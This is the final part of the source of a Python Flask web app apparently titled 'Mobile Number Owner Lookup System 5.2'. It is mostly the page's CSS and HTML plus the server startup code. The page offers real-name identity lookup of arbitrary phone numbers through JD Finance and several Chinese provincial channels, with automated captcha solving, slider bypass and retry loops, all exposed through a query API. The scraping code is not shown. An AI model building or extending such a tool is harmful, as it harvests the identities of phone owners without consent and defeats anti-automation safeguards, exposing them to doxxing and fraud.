        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { 
            background: linear-gradient(135deg, #00b4d8 0%, #90e0ef 30%, #ffd700 80%, #ffaa00 100%);
            min-height: 100vh; 
            padding: 20px; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            color: #333; 
        }
        .container { 
            width: 100%; 
            max-width: 1300px; 
            background: rgba(255, 255, 255, 0.92); 
            border-radius: 24px; 
            overflow: hidden; 
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.3); 
            animation: fadeIn 0.8s ease-out; 
            backdrop-filter: blur(10px);
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(30px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
        
        .header { 
            background: linear-gradient(135deg, #0077b6 0%, #00b4d8 50%, #90e0ef 100%);
            color: white; 
            padding: 40px 35px; 
            text-align: center; 
            position: relative; 
            overflow: hidden; 
        }
        .header::before { 
            content: ''; 
            position: absolute; 
            top: -50%; 
            left: -50%; 
            width: 200%; 
            height: 200%; 
            background: radial-gradient(circle, rgba(255,255,255,0.08) 0%, transparent 70%); 
            animation: headerRotate 25s linear infinite; 
        }
        @keyframes headerRotate { 
            0% { transform: rotate(0deg) scale(1); } 
            50% { transform: rotate(180deg) scale(1.1); } 
            100% { transform: rotate(360deg) scale(1); } 
        }
        .header h1 { 
            font-size: 38px; 
            margin-bottom: 8px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            gap: 15px; 
            position: relative; 
            z-index: 1; 
            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
        }
        .header h1 i { font-size: 44px; }
        .header .version { 
            font-size: 16px; 
            background: rgba(255,255,255,0.2); 
            padding: 4px 14px; 
            border-radius: 20px; 
            border: 1px solid rgba(255,255,255,0.3);
        }
        .header p { 
            font-size: 18px; 
            opacity: 0.95; 
            position: relative; 
            z-index: 1; 
            letter-spacing: 1px;
        }
        
        .query-box { 
            background: white; 
            padding: 30px 35px; 
            border-radius: 16px; 
            margin: 30px 35px 15px 35px; 
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08); 
        }
        .query-form { display: flex; gap: 16px; }
        .query-input { 
            flex: 1; 
            padding: 18px 22px; 
            border: 2px solid #e0e0e0; 
            border-radius: 12px; 
            font-size: 18px; 
            transition: all 0.3s; 
            outline: none; 
            background: #f8f9fa; 
        }
        .query-input:focus { 
            border-color: #0077b6; 
            box-shadow: 0 0 0 4px rgba(0, 119, 182, 0.2); 
            background: white; 
        }
        .query-btn { 
            background: linear-gradient(135deg, #0077b6 0%, #00b4d8 100%); 
            color: white; 
            border: none; 
            border-radius: 12px; 
            padding: 0 40px; 
            font-size: 18px; 
            font-weight: 600; 
            cursor: pointer; 
            transition: all 0.3s; 
            display: flex; 
            align-items: center; 
            gap: 10px; 
            box-shadow: 0 4px 15px rgba(0, 119, 182, 0.3); 
        }
        .query-btn:hover { 
            transform: translateY(-3px) scale(1.02); 
            box-shadow: 0 8px 30px rgba(0, 119, 182, 0.4); 
        }
        
        .info-section { padding: 5px 35px 30px; }
        .info-box { 
            background: linear-gradient(135deg, #f8f9fa, #e9ecef); 
            padding: 20px; 
            border-radius: 12px; 
            margin-bottom: 20px; 
            border-left: 5px solid #0077b6; 
        }
        .info-box h3 { 
            color: #0077b6; 
            margin-bottom: 12px; 
            display: flex; 
            align-items: center; 
            gap: 10px; 
            font-size: 18px; 
        }
        .info-box ul { padding-left: 20px; font-size: 15px; }
        .info-box li { margin-bottom: 6px; }
        .support-list { 
            display: grid; 
            grid-template-columns: repeat(4, 1fr); 
            gap: 12px; 
            margin-top: 15px; 
        }
        .province-item { 
            background: white; 
            padding: 14px; 
            border-radius: 10px; 
            text-align: center; 
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.06); 
            transition: all 0.3s; 
            border: 1px solid #f0f0f0; 
            font-size: 15px; 
            position: relative; 
            font-weight: 500;
        }
        .province-item:hover { 
            transform: translateY(-4px); 
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1); 
        }
        .province-item.priority { 
            background: linear-gradient(135deg, #e1251b 0%, #c41230 100%); 
            color: white; 
            font-weight: bold; 
            border: none; 
        }
        .province-item.priority::after { 
            content: "优先"; 
            position: absolute; 
            top: -8px; 
            right: -8px; 
            background: #ffd700; 
            color: #333; 
            font-size: 10px; 
            padding: 2px 8px; 
            border-radius: 10px; 
            font-weight: bold; 
        }
        .province-item.highlight { background: #ffc107; color: #000; font-weight: bold; }
        .province-item.disabled { 
            background: #e9ecef; 
            color: #6c757d; 
            opacity: 0.6;
            text-decoration: line-through;
        }
        .footer { 
            text-align: center; 
            padding: 20px; 
            background: #f8f9fa; 
            border-top: 1px solid #e9ecef; 
            color: #6c757d; 
            font-size: 15px; 
            letter-spacing: 0.5px;
        }
        .footer a { color: #0077b6; text-decoration: none; font-weight: 500; }
        .tag-line { 
            text-align: center; 
            color: #0077b6; 
            font-weight: bold; 
            font-size: 15px; 
            margin-top: 15px; 
        }
        .disabled-notice {
            background: #fff3cd;
            color: #856404;
            padding: 10px 15px;
            border-radius: 8px;
            margin-top: 10px;
            font-size: 14px;
            border-left: 4px solid #ffc107;
        }
        @media (max-width: 992px) {
            .support-list { grid-template-columns: repeat(4, 1fr); }
        }
        @media (max-width: 768px) { 
            .query-form { flex-direction: column; } 
            .query-btn { width: 100%; justify-content: center; padding: 16px; } 
            .header h1 { font-size: 28px; } 
            .support-list { grid-template-columns: repeat(3, 1fr); }
            .container { max-width: 100%; border-radius: 16px; }
            .query-box { margin: 20px; padding: 20px; }
            .info-section { padding: 10px 20px 20px; }
        }
        @media (max-width: 480px) { 
            .support-list { grid-template-columns: repeat(2, 1fr); }
            .header h1 { font-size: 22px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>
                <i class="fas fa-mobile-alt"></i> 手机号机主查询系统
                <span class="version">5.2</span>
            </h1>
            <p>覆盖 8 个渠道 · 一键查询实名信息 · 山东已屏蔽</p>
        </div>
        <div class="query-box">
            <form method="GET" action="/hz/wushuang/jz" class="query-form" id="queryForm">
                <input type="text" class="query-input" name="sjh" id="phoneInput" placeholder="请输入11位手机号码" required pattern="[0-9]{11}" maxlength="11">
                <button type="submit" class="query-btn" id="queryBtn"><i class="fas fa-search"></i> 查询</button>
            </form>
        </div>
        <div class="info-section">
            <div class="info-box">
                <h3><i class="fas fa-info-circle"></i> 使用说明</h3>
                <ul>
                    <li>支持7个渠道并发查询（山东已屏蔽）</li>
                    <li>验证码识别不保存文件，纯内存处理</li>
                    <li>全部内置，无需额外启动任何服务</li>
                    <li>京东金融专属通道，安全可靠</li>
                    <li>浙江支持支付宝APP直接唤起刷脸</li>
                    <li>江苏支持20次自动重试，直到查询成功</li>
                </ul>
            </div>
            <div class="disabled-notice">
                ⚠️ <strong>山东渠道已屏蔽</strong>：云环境不支持 Selenium + Chromium，查询会显示"暂不支持"
            </div>
            <h3 style="margin-bottom: 12px; display: flex; align-items: center; gap: 10px; font-size: 18px; color: #0077b6;">
                <i class="fas fa-map-marked-alt"></i> 支持查询的省份
            </h3>
            <div class="support-list">
                <div class="province-item priority">京东</div>
                <div class="province-item">吉林</div>
                <div class="province-item">四川</div>
                <div class="province-item">安徽</div>
                <div class="province-item">山东<span style="font-size:10px;color:#999;margin-left:4px;">❌</span></div>
                <div class="province-item highlight">江苏</div>
                <div class="province-item" style="background:#4ca1af;color:#fff;">河北</div>
                <div class="province-item" style="background:#8e44ad;color:#fff;">浙江</div>
            </div>
            <div class="tag-line">
                <i class="fas fa-check-circle"></i> 7省联合 · 内存处理 · 全部内置
            </div>
        </div>
        <div class="footer">
            <p>7省联合 · 京东金融 · 全部内置 &nbsp;|&nbsp; API接口：<a href="/api/hz/wushuang/jz?sjh=13800138000">/api/hz/wushuang/jz?sjh=手机号</a></p>
            <p style="color:#999;font-size:11px;margin-top:4px;">⚠️ 山东渠道已屏蔽（云环境不支持Selenium自动化）</p>
        </div>
    </div>
    
    <script>
    document.addEventListener('DOMContentLoaded', function() {
        var btn = document.getElementById('queryBtn');
        if (btn) {
            btn.disabled = false;
            btn.innerHTML = '<i class="fas fa-search"></i> 查询';
        }
    });
    
    document.getElementById('queryForm').addEventListener('submit', function() {
        var btn = document.getElementById('queryBtn');
        if (btn) {
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 查询中...';
        }
    });
    
    document.querySelector('.query-input').focus();
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    try:
        import socket        
        def get_local_ip():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                s.close()
                return ip
            except Exception:
                return "127.0.0.1"
        
        port = int(os.environ.get('PORT', 8080))
        local_ip = get_local_ip()
        
        print("=" * 60)
        print("手机号机主查询系统 5.2 启动中...")
        print("=" * 60)
        print("🚀 7个渠道并发查询 (山东已屏蔽)")
        print("🚀 京东滑块验证")
        print("🚀 通用型验证码识别 (Tesseract + ddddocr双引擎)")
        print("🚀 浙江刷脸二维码支持")
        print("🚀 江苏20次自动重试")
        print("🚀 省份逐个点亮动画效果")
        print("=" * 60)
        print(f"\n🌐 服务已启动！")
        print(f"📱 请在浏览器中打开以下地址：")
        print(f"\n   🔗 http://{local_ip}:{port}")
        print(f"   🔗 http://localhost:{port}")
        print(f"\n💡 按 Ctrl+C 停止服务")
        print(f"{'='*60}\n")
        
        app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
            
    except Exception as e:
        print('❌ 启动失败:', e, file=sys.stderr)
        raise
